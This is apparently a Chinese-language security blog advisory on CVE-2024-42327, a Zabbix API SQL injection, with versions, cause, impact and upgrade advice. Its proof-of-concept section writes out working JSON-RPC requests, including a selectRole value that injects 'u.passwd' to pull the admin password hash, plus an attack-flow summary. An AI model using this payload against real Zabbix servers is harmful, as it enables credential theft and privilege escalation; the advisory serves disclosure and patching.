#  CVE-2024-42327 Zabbix 严重漏洞POC已公开！   
原创 一个不正经的黑客  一个不正经的黑客   2024-12-03 16:01  
  
# CVE-2024-42327 Zabbix API SQL注入漏洞公开POC  
## 漏洞情况  
  
官方通报：  
  
https://support.zabbix.com/browse/ZBX-25623  
  
漏洞类型：  
  
SQL 注入（SQL Injection, CWE-89）；  
  
漏洞编号：CVE-2024-42327；  
  
严重性等级：Critical（严重）；  
  
CVSS 分数：9.9；  
  
影响范围：Zabbix 6.0.0 至 6.0.31、Zabbix 6.4.0 至 6.4.16、Zabbix 7.0.0；  
  
修复版本：6.0.32rc1、6.4.17rc1、7.0.1rc1  
  
![](https://mmbiz.qpic.cn/mmbiz_png/cxf9lzscpMp3Lp8DlgqO7GFTeTiczJry9CBakB10LlYxyicu0bu4AxlCsibUBnx35fNsslptZdCJibMYpPGc6MdZMg/640?wx_fmt=png&from=appmsg "")  
  
## 漏洞描述  
  
在 Zabbix 前端，具有默认“用户”（User）角色或其他具备 API 访问权限的非管理员用户，可以利用该漏洞发起攻击。  
  
SQL 注入存在于 CUser 类的 addRelatedObjects 函数中，而该函数由 CUser.get API 调用。  
  
由于所有具备 API 访问权限的用户均可调用 CUser.get，导致低权限用户能够注入恶意 SQL 语句，进而实现权限提升、敏感信息访问或其他更严重的攻击行为  
## 漏洞成因  
  
漏洞源于 addRelatedObjects 函数对输入参数的处理不当，未对传入的 SQL 查询参数进行充分验证。  
  
攻击者可以通过 CUser.get API，构造恶意请求注入 SQL 语句。  
## 利用条件  
  
攻击者需要具备 API 访问权限，默认情况下 Zabbix 前端的“用户”角色即可满足条件，因此漏洞利用门槛较低。  
## 攻击后果  
  
权限提升：低权限用户可通过注入 SQL，访问到管理员权限账号的数据或其他敏感信息。  
  
数据泄露：攻击者可利用注入的 SQL 查询数据库内容，窃取关键信息。  
  
系统入侵：攻击者可能通过注入恶意 SQL 语句，执行进一步的持久化攻击或破坏操作。  
## 官方响应  
  
该漏洞由安全研究员 Márk Rákóczi（HackerOne 平台用户“reeeeeeeeeeee”）报告，已在以下版本中修复：6.0.32rc1、6.4.17rc1、7.0.1rc1, 漏洞修复的版本信息在 2024 年 11 月 27 日公开,建议用户尽快升级到修复版本！  
## POC 公开  
  
目前POC已经公开,由于目前公众号的后台程序运行异常，需要的朋友可以自行去取：  
  
https://github.com/aramosf/cve-2024-42327  
  
**1. 登录请求 (Login Request)**  
  
**请求方法**  
: POST  
  
**URL**  
: http://<目标地址>/api_jsonrpc.php  
  
**请求体**  
:  
```
1{2  "jsonrpc": "2.0",3  "method": "user.login",4  "params": {5    "username": "aramosf",6    "password": "Hola1234"7  },8  "id": 19}
```  
  
**响应示例**  
:  
```
1{2  "jsonrpc": "2.0",3  "result": "cfb2be2d7aa9a8b432c5db2a19cd7f73",4  "id": 15}
```  
  
响应中 result 字段的值 (cfb2be2d7aa9a8b432c5db2a19cd7f73) 是会话令牌 (session token)，用于后续的 API 请求。  
  
**2. 获取用户信息请求 (Fetch User Details Request)**  
  
**请求方法**  
: POST  
  
**URL**  
: http://<目标地址>/api_jsonrpc.php  
  
**请求体**  
:  
```
1{2  "jsonrpc": "2.0",3  "method": "user.get",4  "params": {5    "selectRole": ["roleid, u.passwd", "roleid"],6    "userids": "1"7  },8  "auth": "cfb2be2d7aa9a8b432c5db2a19cd7f73",9  "id": 110}
```  
  
**响应示例**  
:  
```
1{2  "jsonrpc": "2.0",3  "result": [4    {5      "userid": "1",6      "username": "Admin",7      "name": "System",8      "surname": "Administrator",9      "role": {10        "passwd": "d41d8cd98f00b204e9800998ecf8427e"11      }12    }13  ],14  "id": 115}
```  
  
**攻击流程总结**  
  
1.**登录获取令牌**  
: 攻击者首先利用 user.login 方法，通过提供合法的用户名和密码，获得会话令牌。  
  
2.**批量请求用户信息**  
: 使用 user.get 方法，枚举用户 ID 并提取相关用户详细信息。  
  
3.**攻击数据分析**  
: 响应中的数据可能包含敏感信息（如用户名、哈希密码等），攻击者可以进一步尝试破解密码或分析用户权限。  
## 漏洞点评  
  
CVSS 9.9 评分的漏洞，利用条件较低，建议及时排查修复升级到修复版本。  
  
  
